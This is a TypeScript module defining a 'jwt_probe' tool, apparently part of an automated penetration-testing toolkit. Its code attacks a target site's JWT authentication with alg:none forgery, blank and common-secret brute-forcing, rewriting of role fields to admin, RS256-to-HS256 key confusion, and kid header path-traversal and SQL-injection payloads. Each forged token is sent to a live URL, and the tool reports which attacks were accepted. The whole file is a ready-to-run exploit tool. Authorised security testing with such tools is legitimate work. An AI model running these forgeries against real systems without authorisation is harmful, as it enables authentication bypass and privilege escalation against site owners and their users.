import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';
import { createHmac } from 'node:crypto';

const definition: ToolDefinition = {
  name: 'jwt_probe',
  description: 'JWT attack suite: alg:none bypass (4 case variants), blank secret, 15 common secrets brute-forced in-memory via HMAC, RS256-to-HS256 confusion with public key, kid header path traversal and SQLi injection.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'token', type: 'string', required: true, description: 'The JWT string to attack (header.payload.signature format)' },
    { name: 'target_url', type: 'string', required: true, description: 'URL where the JWT is validated — used to test each forged token' },
    { name: 'header_name', type: 'string', required: false, description: 'Header name to send the JWT in', default: 'Authorization' },
    { name: 'header_prefix', type: 'string', required: false, description: 'Prefix before the token value', default: 'Bearer ' },
    { name: 'public_key', type: 'string', required: false, description: 'PEM public key for RS256-to-HS256 confusion attack' },
    { name: 'custom_secrets', type: 'string', required: false, description: 'JSON array of additional secrets to brute-force e.g. ["myapp","supersecret"]' },
    { name: 'method', type: 'string', required: false, description: 'HTTP method', default: 'GET' },
    { name: 'timeout_ms', type: 'number', required: false, description: 'Per-test timeout in ms', default: 6000 },
  ],
};

const COMMON_SECRETS = [
  'secret', 'password', 'jwt_secret', 'supersecret', 'mysecret',
  '12345', '123456', 'changeit', 'changeme', 'admin', 'key',
  'private', 'qwerty', 'letmein', 'test',
];

interface AttackResult {
  name: string;
  variant?: string;
  status: number;
  length: number;
  accepted: boolean;
  secret_found?: string;
  error?: string;
}

function b64urlEncode(data: string): string {
  return Buffer.from(data, 'utf8')
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

function b64urlDecode(data: string): string {
  const padded = data.replace(/-/g, '+').replace(/_/g, '/');
  const padding = (4 - (padded.length % 4)) % 4;
  return Buffer.from(padded + '='.repeat(padding), 'base64').toString('utf8');
}

function hmacSign(headerB64: string, payloadB64: string, secret: string): string {
  return createHmac('sha256', secret)
    .update(`${headerB64}.${payloadB64}`)
    .digest('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

function buildToken(headerObj: Record<string, unknown>, payloadB64: string, signature: string): string {
  return `${b64urlEncode(JSON.stringify(headerObj))}.${payloadB64}.${signature}`;
}

async function testToken(
  targetUrl: string,
  method: string,
  headerName: string,
  headerPrefix: string,
  token: string,
  baselineStatus: number,
  baselineLength: number,
  timeoutMs: number,
): Promise<{ status: number; length: number; accepted: boolean }> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const resp = await fetch(targetUrl, {
      method,
      headers: {
        'User-Agent': 'Mozilla/5.0',
        [headerName]: `${headerPrefix}${token}`,
      },
      signal: controller.signal,
    });
    clearTimeout(timer);
    const body = await resp.text();
    const accepted = resp.status === baselineStatus && Math.abs(body.length - baselineLength) < Math.max(200, baselineLength * 0.1);
    return { status: resp.status, length: body.length, accepted };
  } catch {
    clearTimeout(timer);
    return { status: 0, length: 0, accepted: false };
  }
}

export const jwtProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const rawToken = String(params.token || '');
    const targetUrl = String(params.target_url || '');
    const headerName = String(params.header_name || 'Authorization');
    const headerPrefix = String(params.header_prefix || 'Bearer ');
    const publicKey = String(params.public_key || '');
    const method = String(params.method || 'GET').toUpperCase();
    const timeoutMs = Number(params.timeout_ms || 6000);

    let customSecrets: string[] = [];
    if (params.custom_secrets) {
      try {
        customSecrets = JSON.parse(String(params.custom_secrets));
      } catch { /* ignore */ }
    }

    const parts = rawToken.split('.');
    if (parts.length !== 3) {
      return { output: 'Invalid JWT format — expected header.payload.signature', parsed: { error: 'invalid jwt' } };
    }

    const [headerB64, payloadB64, originalSig] = parts;

    let originalHeader: Record<string, unknown> = {};
    let originalPayload: Record<string, unknown> = {};
    try {
      originalHeader = JSON.parse(b64urlDecode(headerB64));
      originalPayload = JSON.parse(b64urlDecode(payloadB64));
    } catch {
      return { output: 'Failed to decode JWT header or payload', parsed: { error: 'decode failed' } };
    }

    const originalAlg = String(originalHeader.alg ?? 'unknown');
    const kidPresent = 'kid' in originalHeader;

    // Baseline — test with the original token
    const baseline = await testToken(targetUrl, method, headerName, headerPrefix, rawToken, 200, 9999, timeoutMs);
    const baselineStatus = baseline.status;
    const baselineLength = baseline.length;

    const attacks: AttackResult[] = [];
    const confirmedAttacks: string[] = [];

    // Attack 1: alg:none (4 case variants)
    for (const algVariant of ['none', 'None', 'NONE', 'nOnE']) {
      const forgedHeader = { ...originalHeader, alg: algVariant };
      const forgedToken = `${b64urlEncode(JSON.stringify(forgedHeader))}.${payloadB64}.`;
      const result = await testToken(targetUrl, method, headerName, headerPrefix, forgedToken, baselineStatus, baselineLength, timeoutMs);
      const attack: AttackResult = { name: 'alg:none', variant: algVariant, ...result };
      attacks.push(attack);
      if (result.accepted) confirmedAttacks.push(`alg:none (${algVariant})`);
    }

    // Attack 2: Blank secret HS256
    const blankSig = hmacSign(headerB64, payloadB64, '');
    const blankToken = `${headerB64}.${payloadB64}.${blankSig}`;
    const blankResult = await testToken(targetUrl, method, headerName, headerPrefix, blankToken, baselineStatus, baselineLength, timeoutMs);
    attacks.push({ name: 'Blank secret (HS256 with "")', ...blankResult });
    if (blankResult.accepted) confirmedAttacks.push('Blank secret');

    // Attack 3: Common secret brute-force (in-memory HMAC, only HTTP if match found)
    const allSecrets = [...COMMON_SECRETS, ...customSecrets];
    let foundSecret: string | undefined;

    for (const secret of allSecrets) {
      const sig = hmacSign(headerB64, payloadB64, secret);
      if (sig === originalSig) {
        foundSecret = secret;
        break;
      }
    }

    if (foundSecret) {
      // Re-sign with escalated payload if possible
      const escalatedPayload = { ...originalPayload };
      if ('role' in escalatedPayload) escalatedPayload['role'] = 'admin';
      if ('admin' in escalatedPayload) escalatedPayload['admin'] = true;
      if ('isAdmin' in escalatedPayload) escalatedPayload['isAdmin'] = true;

      const escalatedPayloadB64 = b64urlEncode(JSON.stringify(escalatedPayload));
      const escalatedSig = hmacSign(headerB64, escalatedPayloadB64, foundSecret);
      const escalatedToken = `${headerB64}.${escalatedPayloadB64}.${escalatedSig}`;
      const escalateResult = await testToken(targetUrl, method, headerName, headerPrefix, escalatedToken, baselineStatus, baselineLength, timeoutMs);
      attacks.push({ name: 'Common secret brute-force', secret_found: foundSecret, ...escalateResult });
      if (escalateResult.accepted) confirmedAttacks.push(`Secret found: "${foundSecret}"`);
    } else {
      attacks.push({ name: 'Common secret brute-force (15 + custom)', status: 0, length: 0, accepted: false });
    }

    // Attack 4: RS256 → HS256 confusion (if public key provided)
    if (publicKey) {
      try {
        const confusionHeader = { ...originalHeader, alg: 'HS256' };
        const confusionHeaderB64 = b64urlEncode(JSON.stringify(confusionHeader));
        const confusionSig = hmacSign(confusionHeaderB64, payloadB64, publicKey);
        const confusionToken = `${confusionHeaderB64}.${payloadB64}.${confusionSig}`;
        const confResult = await testToken(targetUrl, method, headerName, headerPrefix, confusionToken, baselineStatus, baselineLength, timeoutMs);
        attacks.push({ name: 'RS256→HS256 confusion (public key as secret)', ...confResult });
        if (confResult.accepted) confirmedAttacks.push('RS256→HS256 confusion');
      } catch (err) {
        attacks.push({ name: 'RS256→HS256 confusion', status: 0, length: 0, accepted: false, error: String(err) });
      }
    }

    // Attack 5: kid injection (if kid header present)
    if (kidPresent) {
      const kidPayloads = [
        { name: 'kid path traversal (/dev/null)', value: '../../dev/null' },
        { name: 'kid SQLi', value: "x' UNION SELECT 'secret'-- " },
      ];

      for (const kidPayload of kidPayloads) {
        const injectedHeader = { ...originalHeader, kid: kidPayload.value, alg: 'HS256' };
        const injectedHeaderB64 = b64urlEncode(JSON.stringify(injectedHeader));
        const injectedSig = hmacSign(injectedHeaderB64, payloadB64, '');
        const injectedToken = `${injectedHeaderB64}.${payloadB64}.${injectedSig}`;
        const kidResult = await testToken(targetUrl, method, headerName, headerPrefix, injectedToken, baselineStatus, baselineLength, timeoutMs);
        attacks.push({ name: `kid injection: ${kidPayload.name}`, ...kidResult });
        if (kidResult.accepted) confirmedAttacks.push(kidPayload.name);
      }
    }

    const payloadSummary: Record<string, unknown> = {};
    const skipKeys = ['iat', 'exp', 'nbf', 'jti'];
    for (const [k, v] of Object.entries(originalPayload)) {
      if (!skipKeys.includes(k)) payloadSummary[k] = v;
    }

    const divider = '─'.repeat(80);
    const rows = attacks.map(a =>
      `  ${(a.name + (a.variant ? ` (${a.variant})` : '')).padEnd(45)} | ${String(a.status).padEnd(4)} | ${a.accepted ? 'ACCEPTED' : 'rejected'}${a.secret_found ? ` (secret: "${a.secret_found}")` : ''}`
    ).join('\n');

    const output = [
      `JWT Probe Results — ${targetUrl}`,
      divider,
      `Original alg: ${originalAlg} | kid present: ${kidPresent} | Baseline: ${baselineStatus}/${baselineLength}b`,
      `Payload fields: ${JSON.stringify(payloadSummary)}`,
      divider,
      `  ${'Attack'.padEnd(45)} | ${'Code'.padEnd(4)} | Result`,
      divider,
      rows,
      divider,
      '',
      confirmedAttacks.length > 0
        ? `CONFIRMED ATTACKS: ${confirmedAttacks.join(', ')}`
        : 'No attacks succeeded — JWT implementation appears secure',
    ].join('\n');

    return {
      output,
      parsed: {
        original_alg: originalAlg,
        original_payload_summary: payloadSummary,
        kid_present: kidPresent,
        baseline_status: baselineStatus,
        attacks: attacks as unknown as Record<string, unknown>[],
        confirmed_attacks: confirmedAttacks,
        highest_severity: confirmedAttacks.length > 0 ? 'critical' : 'info',
      },
    };
  },
};
